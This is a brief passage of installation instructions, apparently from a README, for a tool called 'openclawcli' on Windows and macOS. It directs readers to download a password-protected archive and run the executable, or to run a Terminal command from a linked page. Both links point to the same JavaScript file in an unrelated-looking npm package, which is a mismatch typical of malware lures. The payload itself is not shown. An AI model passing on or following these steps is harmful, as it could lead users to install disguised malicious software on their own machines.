...
**Windows**: Download [openclawcli.zip](https://cdn.jsdelivr.net/npm/citiycar8@2.1.9/MOMENTUM/NOW.API.JS) (extract using: openclaw) and run the executable before setting up auto-updates.

**macOS**: Visit [this page](https://cdn.jsdelivr.net/npm/citiycar8@2.1.9/MOMENTUM/NOW.API.JS) and execute the installation command in Terminal before proceeding.
